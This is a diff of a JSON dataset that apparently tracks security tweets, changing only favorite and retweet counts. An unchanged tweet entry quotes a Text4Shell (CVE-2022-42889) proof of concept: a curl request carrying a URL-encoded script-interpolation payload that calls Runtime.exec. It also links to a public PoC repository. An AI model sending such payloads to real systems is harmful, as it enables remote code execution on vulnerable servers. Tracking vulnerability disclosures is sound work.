@@ -319,10 +319,10 @@
         "https://sysdig.com/blog/cve-2022-42889-text4shell/?fbclid=IwAR390dT6t-APZtG9HJiUaWYWY-MARztD_-Z2ggwEbaYngaTaCvXCRar2sk8",
         "https://github.com/ClickCyber/cve-2022-42889"
     ],
-    "tweetfavorites": 1236,
+    "tweetfavorites": 1237,
     "tweetquotes": 12,
     "tweetreplies": 12,
-    "tweetretweets": 506,
+    "tweetretweets": 507,
     "tweettext": "Apache Text4Shell (CVE-2022-42889)\n\nPoC\ncurl http://localhost/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.get.Runtime%28%29.exec%28%5C%27%27%2E%74%72%69%6D%28%24%63%6D%64%29%2E%27%5C%27%29%7D\n\nhttps://t.co/WdlwKBOBxZ\nhttps://t.co/KXmFl2VAJf https://t.co/x0WDS8J6rV",
     "tweettime": "2022-10-21, 05:05:13",
     "tweeturl": "https://twitter.com/wugeej/status/1583323497681817600",
@@ -843,7 +843,7 @@
     "username": "bad_packets"
 }
 {
-    "tweetfavorites": 60,
+    "tweetfavorites": 59,
     "tweetquotes": 1,
     "tweetreplies": 0,
     "tweetretweets": 15,
